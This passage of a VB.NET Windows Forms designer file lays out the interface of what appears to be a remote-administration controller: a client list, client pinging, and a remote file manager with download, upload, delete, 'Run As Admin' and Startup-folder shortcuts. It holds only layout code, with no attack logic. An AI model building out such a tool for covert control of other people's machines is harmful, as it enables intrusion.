        Me.debugView.Size = New System.Drawing.Size(870, 142)
        Me.debugView.TabIndex = 23
        Me.debugView.Text = ""
        '
        'Panel13
        '
        Me.Panel13.BackColor = System.Drawing.Color.Black
        Me.Panel13.Controls.Add(Me.Label14)
        Me.Panel13.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel13.Location = New System.Drawing.Point(0, 0)
        Me.Panel13.Name = "Panel13"
        Me.Panel13.Size = New System.Drawing.Size(1753, 31)
        Me.Panel13.TabIndex = 22
        '
        'Label14
        '
        Me.Label14.AutoSize = True
        Me.Label14.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!)
        Me.Label14.ForeColor = System.Drawing.Color.Silver
        Me.Label14.Location = New System.Drawing.Point(13, 10)
        Me.Label14.Name = "Label14"
        Me.Label14.Size = New System.Drawing.Size(113, 16)
        Me.Label14.TabIndex = 0
        Me.Label14.Text = "&Internal debugger"
        '
        'pingDisabledClients
        '
        Me.pingDisabledClients.Enabled = True
        Me.pingDisabledClients.Interval = 5000
        '
        'btnUnhideClientsPanel
        '
        Me.btnUnhideClientsPanel.BackColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.btnUnhideClientsPanel.FlatAppearance.BorderSize = 0
        Me.btnUnhideClientsPanel.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnUnhideClientsPanel.ForeColor = System.Drawing.Color.White
        Me.btnUnhideClientsPanel.Location = New System.Drawing.Point(0, 33)
        Me.btnUnhideClientsPanel.Name = "btnUnhideClientsPanel"
        Me.btnUnhideClientsPanel.Size = New System.Drawing.Size(23, 116)
        Me.btnUnhideClientsPanel.TabIndex = 14
        Me.btnUnhideClientsPanel.Text = ">"
        Me.btnUnhideClientsPanel.UseVisualStyleBackColor = False
        '
        'hiddenPanel
        '
        Me.hiddenPanel.Controls.Add(Me.clientList)
        Me.hiddenPanel.Controls.Add(Me.Panel9)
        Me.hiddenPanel.Location = New System.Drawing.Point(105, 829)
        Me.hiddenPanel.Name = "hiddenPanel"
        Me.hiddenPanel.Size = New System.Drawing.Size(266, 408)
        Me.hiddenPanel.TabIndex = 15
        Me.hiddenPanel.Visible = False
        '
        'clientList
        '
        Me.clientList.BackColor = System.Drawing.Color.Black
        Me.clientList.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.clientList.Dock = System.Windows.Forms.DockStyle.Fill
        Me.clientList.Font = New System.Drawing.Font("Consolas", 11.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.clientList.ForeColor = System.Drawing.Color.Firebrick
        Me.clientList.FormattingEnabled = True
        Me.clientList.ItemHeight = 18
        Me.clientList.Location = New System.Drawing.Point(0, 34)
        Me.clientList.Name = "clientList"
        Me.clientList.Size = New System.Drawing.Size(266, 374)
        Me.clientList.TabIndex = 23
        '
        'iconList
        '
        Me.iconList.ImageStream = CType(resources.GetObject("iconList.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.iconList.TransparentColor = System.Drawing.Color.Transparent
        Me.iconList.Images.SetKeyName(0, "folder.png")
        Me.iconList.Images.SetKeyName(1, "file.png")
        Me.iconList.Images.SetKeyName(2, "ico205.ico")
        '
        'lblColumnFtp3
        '
        Me.lblColumnFtp3.AutoSize = True
        Me.lblColumnFtp3.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.lblColumnFtp3.ForeColor = System.Drawing.Color.Gray
        Me.lblColumnFtp3.Location = New System.Drawing.Point(368, 26)
        Me.lblColumnFtp3.Name = "lblColumnFtp3"
        Me.lblColumnFtp3.Size = New System.Drawing.Size(112, 15)
        Me.lblColumnFtp3.TabIndex = 7
        Me.lblColumnFtp3.Text = "Last Write Time"
        '
        'lblColumnFtp2
        '
        Me.lblColumnFtp2.AutoSize = True
        Me.lblColumnFtp2.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.lblColumnFtp2.ForeColor = System.Drawing.Color.Gray
        Me.lblColumnFtp2.Location = New System.Drawing.Point(302, 26)
        Me.lblColumnFtp2.Name = "lblColumnFtp2"
        Me.lblColumnFtp2.Size = New System.Drawing.Size(35, 15)
        Me.lblColumnFtp2.TabIndex = 6
        Me.lblColumnFtp2.Text = "Size"
        '
        'lblColumnFtp1
        '
        Me.lblColumnFtp1.AutoSize = True
        Me.lblColumnFtp1.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.lblColumnFtp1.ForeColor = System.Drawing.Color.Gray
        Me.lblColumnFtp1.Location = New System.Drawing.Point(6, 26)
        Me.lblColumnFtp1.Name = "lblColumnFtp1"
        Me.lblColumnFtp1.Size = New System.Drawing.Size(77, 15)
        Me.lblColumnFtp1.TabIndex = 5
        Me.lblColumnFtp1.Text = "File Names"
        '
        'ftpUrl
        '
        Me.ftpUrl.BackColor = System.Drawing.Color.Black
        Me.ftpUrl.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.ftpUrl.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.ftpUrl.ForeColor = System.Drawing.Color.White
        Me.ftpUrl.Location = New System.Drawing.Point(10, 5)
        Me.ftpUrl.Multiline = True
        Me.ftpUrl.Name = "ftpUrl"
        Me.ftpUrl.ShortcutsEnabled = False
        Me.ftpUrl.Size = New System.Drawing.Size(867, 18)
        Me.ftpUrl.TabIndex = 2
        Me.ftpUrl.Text = "\"
        Me.ftpUrl.WordWrap = False
        '
        'btnFtpDownloadInterrupt
        '
        Me.btnFtpDownloadInterrupt.BackColor = System.Drawing.Color.Black
        Me.btnFtpDownloadInterrupt.FlatAppearance.BorderSize = 0
        Me.btnFtpDownloadInterrupt.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnFtpDownloadInterrupt.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!)
        Me.btnFtpDownloadInterrupt.ForeColor = System.Drawing.Color.Silver
        Me.btnFtpDownloadInterrupt.Location = New System.Drawing.Point(6, 473)
        Me.btnFtpDownloadInterrupt.Name = "btnFtpDownloadInterrupt"
        Me.btnFtpDownloadInterrupt.Size = New System.Drawing.Size(121, 22)
        Me.btnFtpDownloadInterrupt.TabIndex = 24
        Me.btnFtpDownloadInterrupt.Text = "&Cancel download"
        Me.btnFtpDownloadInterrupt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnFtpDownloadInterrupt.UseVisualStyleBackColor = False
        '
        'ftpMenu
        '
        Me.ftpMenu.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ftpMenu.ImageScalingSize = New System.Drawing.Size(20, 20)
        Me.ftpMenu.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.btnFtpOpen, Me.ToolStripSeparator2, Me.ftpBtnDownloadFile, Me.ftpBtnRename, Me.ToolStripSeparator1, Me.ftpBtnDelete, Me.ToolStripSeparator3, Me.btnFtpRun, Me.btnFtpRunAs})
        Me.ftpMenu.Name = "ftpMenu"
        Me.ftpMenu.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.ftpMenu.Size = New System.Drawing.Size(151, 154)
        '
        'btnFtpOpen
        '
        Me.btnFtpOpen.ForeColor = System.Drawing.Color.White
        Me.btnFtpOpen.Name = "btnFtpOpen"
        Me.btnFtpOpen.Size = New System.Drawing.Size(150, 22)
        Me.btnFtpOpen.Text = "&Open"
        '
        'ToolStripSeparator2
        '
        Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
        Me.ToolStripSeparator2.Size = New System.Drawing.Size(147, 6)
        '
        'ftpBtnDownloadFile
        '
        Me.ftpBtnDownloadFile.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ftpBtnDownloadFile.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text
        Me.ftpBtnDownloadFile.ForeColor = System.Drawing.Color.White
        Me.ftpBtnDownloadFile.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.ftpBtnDownloadFile.Name = "ftpBtnDownloadFile"
        Me.ftpBtnDownloadFile.Size = New System.Drawing.Size(150, 22)
        Me.ftpBtnDownloadFile.Text = "Download"
        Me.ftpBtnDownloadFile.TextImageRelation = System.Windows.Forms.TextImageRelation.TextBeforeImage
        '
        'ftpBtnRename
        '
        Me.ftpBtnRename.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ftpBtnRename.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text
        Me.ftpBtnRename.ForeColor = System.Drawing.Color.White
        Me.ftpBtnRename.Name = "ftpBtnRename"
        Me.ftpBtnRename.Size = New System.Drawing.Size(150, 22)
        Me.ftpBtnRename.Text = "Rename"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(147, 6)
        '
        'ftpBtnDelete
        '
        Me.ftpBtnDelete.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ftpBtnDelete.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text
        Me.ftpBtnDelete.ForeColor = System.Drawing.Color.White
        Me.ftpBtnDelete.Name = "ftpBtnDelete"
        Me.ftpBtnDelete.Size = New System.Drawing.Size(150, 22)
        Me.ftpBtnDelete.Text = "Delete"
        '
        'ToolStripSeparator3
        '
        Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
        Me.ToolStripSeparator3.Size = New System.Drawing.Size(147, 6)
        '
        'btnFtpRun
        '
        Me.btnFtpRun.ForeColor = System.Drawing.Color.White
        Me.btnFtpRun.Name = "btnFtpRun"
        Me.btnFtpRun.Size = New System.Drawing.Size(150, 22)
        Me.btnFtpRun.Text = "&Run"
        '
        'btnFtpRunAs
        '
        Me.btnFtpRunAs.ForeColor = System.Drawing.Color.White
        Me.btnFtpRunAs.Name = "btnFtpRunAs"
        Me.btnFtpRunAs.Size = New System.Drawing.Size(150, 22)
        Me.btnFtpRunAs.Text = "&Run As Admin"
        '
        'ftpMenuEmptyClick
        '
        Me.ftpMenuEmptyClick.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ftpMenuEmptyClick.ImageScalingSize = New System.Drawing.Size(20, 20)
        Me.ftpMenuEmptyClick.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ftpBtnRefresh, Me.ftpNewToolstrip, Me.ftpBtnUpload})
        Me.ftpMenuEmptyClick.Name = "ftpMenuEmptyClick"
        Me.ftpMenuEmptyClick.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.ftpMenuEmptyClick.Size = New System.Drawing.Size(114, 70)
        '
        'ftpBtnRefresh
        '
        Me.ftpBtnRefresh.ForeColor = System.Drawing.Color.White
        Me.ftpBtnRefresh.Name = "ftpBtnRefresh"
        Me.ftpBtnRefresh.Size = New System.Drawing.Size(113, 22)
        Me.ftpBtnRefresh.Text = "&Refresh"
        '
        'ftpNewToolstrip
        '
        Me.ftpNewToolstrip.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ftpNewToolstrip.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text
        Me.ftpNewToolstrip.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ftpBtnNewFolder, Me.ftpBtnNewFile})
        Me.ftpNewToolstrip.ForeColor = System.Drawing.Color.White
        Me.ftpNewToolstrip.Name = "ftpNewToolstrip"
        Me.ftpNewToolstrip.Size = New System.Drawing.Size(113, 22)
        Me.ftpNewToolstrip.Text = "&New"
        '
        'ftpBtnNewFolder
        '
        Me.ftpBtnNewFolder.Name = "ftpBtnNewFolder"
        Me.ftpBtnNewFolder.Size = New System.Drawing.Size(107, 22)
        Me.ftpBtnNewFolder.Text = "Folder"
        '
        'ftpBtnNewFile
        '
        Me.ftpBtnNewFile.Name = "ftpBtnNewFile"
        Me.ftpBtnNewFile.Size = New System.Drawing.Size(107, 22)
        Me.ftpBtnNewFile.Text = "File"
        '
        'ftpBtnUpload
        '
        Me.ftpBtnUpload.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ftpBtnUpload.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text
        Me.ftpBtnUpload.ForeColor = System.Drawing.Color.White
        Me.ftpBtnUpload.Name = "ftpBtnUpload"
        Me.ftpBtnUpload.Size = New System.Drawing.Size(113, 22)
        Me.ftpBtnUpload.Text = "&Upload"
        '
        'Panel12
        '
        Me.Panel12.BackColor = System.Drawing.Color.Black
        Me.Panel12.Controls.Add(Me.btnFtpUploadInterrupt)
        Me.Panel12.Controls.Add(Me.btnFtpDownloadInterrupt)
        Me.Panel12.Controls.Add(Me.Panel1)
        Me.Panel12.Controls.Add(Me.Label16)
        Me.Panel12.Dock = System.Windows.Forms.DockStyle.Left
        Me.Panel12.Location = New System.Drawing.Point(0, 0)
        Me.Panel12.Margin = New System.Windows.Forms.Padding(0)
        Me.Panel12.Name = "Panel12"
        Me.Panel12.Size = New System.Drawing.Size(147, 515)
        Me.Panel12.TabIndex = 19
        '
        'btnFtpUploadInterrupt
        '
        Me.btnFtpUploadInterrupt.BackColor = System.Drawing.Color.Black
        Me.btnFtpUploadInterrupt.FlatAppearance.BorderSize = 0
        Me.btnFtpUploadInterrupt.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnFtpUploadInterrupt.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!)
        Me.btnFtpUploadInterrupt.ForeColor = System.Drawing.Color.Silver
        Me.btnFtpUploadInterrupt.Location = New System.Drawing.Point(6, 491)
        Me.btnFtpUploadInterrupt.Name = "btnFtpUploadInterrupt"
        Me.btnFtpUploadInterrupt.Size = New System.Drawing.Size(112, 22)
        Me.btnFtpUploadInterrupt.TabIndex = 24
        Me.btnFtpUploadInterrupt.Text = "&Cancel upload"
        Me.btnFtpUploadInterrupt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnFtpUploadInterrupt.UseVisualStyleBackColor = False
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.Black
        Me.Panel1.Controls.Add(Me.btnShortcutHome)
        Me.Panel1.Controls.Add(Me.btnShortcutRecycleBin)
        Me.Panel1.Controls.Add(Me.Label11)
        Me.Panel1.Controls.Add(Me.Label2)
        Me.Panel1.Controls.Add(Me.btnShortcutDesktop)
        Me.Panel1.Controls.Add(Me.btnShortcutWindows)
        Me.Panel1.Controls.Add(Me.btnShortcutTemp)
        Me.Panel1.Controls.Add(Me.btnShortcutAppData)
        Me.Panel1.Controls.Add(Me.btnShortcutStartup)
        Me.Panel1.Controls.Add(Me.btnShortcutStartupAll)
        Me.Panel1.Controls.Add(Me.Panel14)
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(147, 328)
        Me.Panel1.TabIndex = 33
        '
        'btnShortcutHome
        '
        Me.btnShortcutHome.BackColor = System.Drawing.Color.Black
        Me.btnShortcutHome.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnShortcutHome.FlatAppearance.BorderSize = 0
        Me.btnShortcutHome.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnShortcutHome.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnShortcutHome.Location = New System.Drawing.Point(18, 247)
        Me.btnShortcutHome.Name = "btnShortcutHome"
        Me.btnShortcutHome.Size = New System.Drawing.Size(114, 22)
        Me.btnShortcutHome.TabIndex = 35
        Me.btnShortcutHome.Text = "&My Computer"
        Me.btnShortcutHome.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnShortcutHome.UseVisualStyleBackColor = False
        '
        'btnShortcutRecycleBin
        '
        Me.btnShortcutRecycleBin.BackColor = System.Drawing.Color.Black
        Me.btnShortcutRecycleBin.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnShortcutRecycleBin.FlatAppearance.BorderSize = 0
        Me.btnShortcutRecycleBin.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnShortcutRecycleBin.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnShortcutRecycleBin.Location = New System.Drawing.Point(18, 270)
        Me.btnShortcutRecycleBin.Name = "btnShortcutRecycleBin"
        Me.btnShortcutRecycleBin.Size = New System.Drawing.Size(114, 22)
        Me.btnShortcutRecycleBin.TabIndex = 36
        Me.btnShortcutRecycleBin.Text = "&Recycle Bin"
        Me.btnShortcutRecycleBin.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnShortcutRecycleBin.UseVisualStyleBackColor = False
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label11.ForeColor = System.Drawing.Color.Silver
        Me.Label11.Location = New System.Drawing.Point(10, 228)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(61, 16)
        Me.Label11.TabIndex = 34
        Me.Label11.Text = "Standard"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.ForeColor = System.Drawing.Color.Silver
        Me.Label2.Location = New System.Drawing.Point(10, 40)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(62, 16)
        Me.Label2.TabIndex = 33
        Me.Label2.Text = "Shortcuts"
        '
        'btnShortcutDesktop
        '
        Me.btnShortcutDesktop.BackColor = System.Drawing.Color.Black
        Me.btnShortcutDesktop.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnShortcutDesktop.FlatAppearance.BorderSize = 0
        Me.btnShortcutDesktop.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnShortcutDesktop.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnShortcutDesktop.Location = New System.Drawing.Point(18, 59)
        Me.btnShortcutDesktop.Name = "btnShortcutDesktop"
        Me.btnShortcutDesktop.Size = New System.Drawing.Size(114, 22)
        Me.btnShortcutDesktop.TabIndex = 27
        Me.btnShortcutDesktop.Text = "&Desktop"
        Me.btnShortcutDesktop.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnShortcutDesktop.UseVisualStyleBackColor = False
        '
        'btnShortcutWindows
        '
        Me.btnShortcutWindows.BackColor = System.Drawing.Color.Black
        Me.btnShortcutWindows.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnShortcutWindows.FlatAppearance.BorderSize = 0
        Me.btnShortcutWindows.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnShortcutWindows.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnShortcutWindows.Location = New System.Drawing.Point(18, 127)
        Me.btnShortcutWindows.Name = "btnShortcutWindows"
        Me.btnShortcutWindows.Size = New System.Drawing.Size(114, 22)
        Me.btnShortcutWindows.TabIndex = 30
        Me.btnShortcutWindows.Text = "&Windows"
        Me.btnShortcutWindows.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnShortcutWindows.UseVisualStyleBackColor = False
        '
        'btnShortcutTemp
        '
        Me.btnShortcutTemp.BackColor = System.Drawing.Color.Black
        Me.btnShortcutTemp.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnShortcutTemp.FlatAppearance.BorderSize = 0
        Me.btnShortcutTemp.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnShortcutTemp.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnShortcutTemp.Location = New System.Drawing.Point(18, 104)
        Me.btnShortcutTemp.Name = "btnShortcutTemp"
        Me.btnShortcutTemp.Size = New System.Drawing.Size(114, 22)
        Me.btnShortcutTemp.TabIndex = 29
        Me.btnShortcutTemp.Text = "&Temp"
        Me.btnShortcutTemp.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnShortcutTemp.UseVisualStyleBackColor = False
        '
        'btnShortcutAppData
        '
        Me.btnShortcutAppData.BackColor = System.Drawing.Color.Black
        Me.btnShortcutAppData.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnShortcutAppData.FlatAppearance.BorderSize = 0
        Me.btnShortcutAppData.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnShortcutAppData.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnShortcutAppData.Location = New System.Drawing.Point(18, 82)
        Me.btnShortcutAppData.Name = "btnShortcutAppData"
        Me.btnShortcutAppData.Size = New System.Drawing.Size(114, 22)
        Me.btnShortcutAppData.TabIndex = 28
        Me.btnShortcutAppData.Text = "&AppData"
        Me.btnShortcutAppData.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnShortcutAppData.UseVisualStyleBackColor = False
        '
        'btnShortcutStartup
        '
        Me.btnShortcutStartup.BackColor = System.Drawing.Color.Black
        Me.btnShortcutStartup.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnShortcutStartup.FlatAppearance.BorderSize = 0
        Me.btnShortcutStartup.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnShortcutStartup.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnShortcutStartup.Location = New System.Drawing.Point(18, 150)
        Me.btnShortcutStartup.Name = "btnShortcutStartup"
        Me.btnShortcutStartup.Size = New System.Drawing.Size(114, 22)
        Me.btnShortcutStartup.TabIndex = 31
        Me.btnShortcutStartup.Text = "&Startup"
        Me.btnShortcutStartup.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnShortcutStartup.UseVisualStyleBackColor = False
        '
        'btnShortcutStartupAll
        '
        Me.btnShortcutStartupAll.BackColor = System.Drawing.Color.Black
        Me.btnShortcutStartupAll.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnShortcutStartupAll.FlatAppearance.BorderSize = 0
        Me.btnShortcutStartupAll.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnShortcutStartupAll.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnShortcutStartupAll.Location = New System.Drawing.Point(18, 172)
        Me.btnShortcutStartupAll.Name = "btnShortcutStartupAll"
        Me.btnShortcutStartupAll.Size = New System.Drawing.Size(114, 22)
        Me.btnShortcutStartupAll.TabIndex = 32
        Me.btnShortcutStartupAll.Text = "&StartupAll"
        Me.btnShortcutStartupAll.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnShortcutStartupAll.UseVisualStyleBackColor = False
        '
        'Panel14
        '
        Me.Panel14.BackColor = System.Drawing.Color.Black
        Me.Panel14.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.Panel14.Controls.Add(Me.ftpBtnBack)
        Me.Panel14.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel14.Location = New System.Drawing.Point(0, 0)
        Me.Panel14.Name = "Panel14"
        Me.Panel14.Size = New System.Drawing.Size(147, 30)
        Me.Panel14.TabIndex = 26
        '
        'ftpBtnBack
        '
        Me.ftpBtnBack.BackColor = System.Drawing.Color.Black
        Me.ftpBtnBack.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.ftpBtnBack.FlatAppearance.BorderSize = 0
        Me.ftpBtnBack.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.ftpBtnBack.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!)
        Me.ftpBtnBack.ForeColor = System.Drawing.Color.Silver
        Me.ftpBtnBack.Location = New System.Drawing.Point(8, 3)
        Me.ftpBtnBack.Name = "ftpBtnBack"
        Me.ftpBtnBack.Size = New System.Drawing.Size(133, 22)
        Me.ftpBtnBack.TabIndex = 25
        Me.ftpBtnBack.Text = "&Go back"
        Me.ftpBtnBack.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.ftpBtnBack.UseVisualStyleBackColor = False
        '
        'Label16
        '
        Me.Label16.AutoSize = True
        Me.Label16.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.Label16.ForeColor = System.Drawing.Color.White
        Me.Label16.Location = New System.Drawing.Point(10, 46)
        Me.Label16.Name = "Label16"
        Me.Label16.Size = New System.Drawing.Size(0, 15)
        Me.Label16.TabIndex = 2
        Me.Label16.Tag = ""
        '
        'Panel6
        '
        Me.Panel6.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Panel6.Controls.Add(Me.lblUploadName)
        Me.Panel6.Controls.Add(Me.lblDownloadName)
        Me.Panel6.Controls.Add(Me.Panel8)
        Me.Panel6.Controls.Add(Me.Panel7)
        Me.Panel6.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.Panel6.Location = New System.Drawing.Point(147, 477)
        Me.Panel6.Name = "Panel6"
        Me.Panel6.Size = New System.Drawing.Size(1329, 38)
        Me.Panel6.TabIndex = 34
        '
        'lblUploadName
        '
        Me.lblUploadName.AutoSize = True
        Me.lblUploadName.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblUploadName.ForeColor = System.Drawing.Color.Silver
        Me.lblUploadName.Location = New System.Drawing.Point(298, 20)
        Me.lblUploadName.Name = "lblUploadName"
        Me.lblUploadName.Size = New System.Drawing.Size(0, 16)
        Me.lblUploadName.TabIndex = 37
        '
        'lblDownloadName
        '
        Me.lblDownloadName.AutoSize = True
        Me.lblDownloadName.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblDownloadName.ForeColor = System.Drawing.Color.Silver
        Me.lblDownloadName.Location = New System.Drawing.Point(298, 3)
        Me.lblDownloadName.Name = "lblDownloadName"
        Me.lblDownloadName.Size = New System.Drawing.Size(0, 16)
        Me.lblDownloadName.TabIndex = 36
        '
        'Panel8
        '
        Me.Panel8.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Panel8.Controls.Add(Me.ftpUploadProgressBar)
        Me.Panel8.Location = New System.Drawing.Point(12, 20)
        Me.Panel8.Name = "Panel8"
        Me.Panel8.Size = New System.Drawing.Size(274, 13)
        Me.Panel8.TabIndex = 30
        '
        'ftpUploadProgressBar
        '
        Me.ftpUploadProgressBar.Location = New System.Drawing.Point(-3, -2)
        Me.ftpUploadProgressBar.Name = "ftpUploadProgressBar"
        Me.ftpUploadProgressBar.Size = New System.Drawing.Size(281, 16)
        Me.ftpUploadProgressBar.Style = MetroFramework.MetroColorStyle.Red
        Me.ftpUploadProgressBar.TabIndex = 39
        Me.ftpUploadProgressBar.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.ftpUploadProgressBar.UseCustomBackColor = True
        '
        'Panel7
        '
        Me.Panel7.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Panel7.Controls.Add(Me.ftpDownloadProgressBar)
        Me.Panel7.Location = New System.Drawing.Point(12, 4)
